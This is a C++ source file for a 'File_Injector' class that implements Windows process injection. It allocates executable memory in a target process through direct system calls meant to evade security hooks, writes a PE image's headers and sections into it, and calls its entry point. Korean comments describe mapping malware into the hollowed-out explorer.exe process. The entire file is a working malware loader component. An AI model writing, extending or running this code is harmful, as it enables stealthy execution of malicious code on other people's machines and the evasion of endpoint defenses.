#include "File_Injector.h"
#include "PE_FILE.h"
#include "directsyscall.h"

File_Injector::File_Injector(HANDLE processHandle)
{
	_allocAddress = 0;
	_entrypointOffset = 0;
	process_handle = NULL;
	if (processHandle)
	{
		process_handle = processHandle;
		remote_check = true;
	}
	else
	{
		remote_check = false;
		process_handle = GetCurrentProcess();
	}
}

File_Injector::~File_Injector()
{
	if (_allocAddress)
	{
		//callEntryPoint_(_allocAddress, _entrypointOffset, DLL_PROCESS_DETACH);

		if (VirtualFreeEx(process_handle, (PVOID)_allocAddress, 0, MEM_RELEASE))
		{
			if (remote_check)
			{
				CloseHandle(process_handle);
				process_handle = NULL;
				remote_check = false;
			}
			_allocAddress = 0;
			_entrypointOffset = 0;
		}
	}
}

ULONG_PTR File_Injector::alloc(SIZE_T size, ULONG_PTR baseAddress)
{
	ULONG_PTR retAddress = 0;
	NTSTATUS status = 0;
	PVOID BaseAddress_ds = (PVOID)baseAddress;
	SIZE_T dsSize = size;

	status = (ULONG_PTR)DirectNtAllocateVirtualMemory(process_handle, &BaseAddress_ds, 0, &dsSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);// PAGE_EXECUTE_READWRITE 권한으로 가상메모리 할당,EXPLORERE 프로세스의 메모리내 할당하는 것으로,  SIZE는 현재 프로세스에 작성된 악성코드 메모리내크기, baseAddress는 EXPLORER의 이미지베이스, EXPLORERE 프로세스 메모리 내 unmap으로 이미지 베이싀 실행 파일 섹션을 할당 해제했으므로 해당 주소에 ㅈ메모리를 할당하는것 해당 권한으로
	if (status == 0)
		retAddress = (ULONG_PTR)BaseAddress_ds;//할당된 페이지 영역의 기본 주소 포인터

	if (!remote_check)
	{
		if (retAddress != NULL)
			ZeroMemory((PVOID)retAddress, size);
	}

	_allocAddress = retAddress;

	return retAddress;
}
void File_Injector::writeHeader(ULONG_PTR destination_Addr, ULONG_PTR source_Addr, ULONG srcSize)// destination_Addr 에 source_Addr의 크기만큼 작성
{
	RtlCopyMemory((PVOID)destination_Addr, (PVOID)source_Addr, srcSize);
}

void File_Injector::writeSection(ULONG_PTR destination_Addr, ULONG_PTR source_Addr, ULONG_PTR sectionAddress)
{
	PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)sectionAddress;

	RtlCopyMemory(((PBYTE)destination_Addr + pSection->VirtualAddress), ((PBYTE)source_Addr + pSection->PointerToRawData), pSection->SizeOfRawData);//pSection 즉 복사할 악성코드의 섹션의 VA 주소를 가져오는데 sectionAddress 매개변수의 값이 반복문을 통한 다음 섹션 주소이므로 하나씩 이동하며 복사
}
bool File_Injector::WriteVirtualMemory(ULONG_PTR destination_Addr, ULONG_PTR source_Addr, SIZE_T size)
{
	SIZE_T writtenSize = 0;


	if (!DirectNtWriteVirtualMemory(process_handle, (PVOID)destination_Addr, (PBYTE)source_Addr, (ULONG)size, (PULONG)&writtenSize))
		return false;

	return true;
}


ULONG File_Injector::callEntryPoint(ULONG_PTR baseAddress, ULONG addressOfEntryPoint)
{
	typedef ULONG(APIENTRY* PFN_DLL_MAIN)(HMODULE DllHandle, ULONG Reason, LPVOID Reserved);

	ULONG Result = ((PFN_DLL_MAIN)((char*)baseAddress + addressOfEntryPoint)) (
		(HMODULE)baseAddress,
		DLL_PROCESS_ATTACH,
		NULL
		);
	return 0;
}


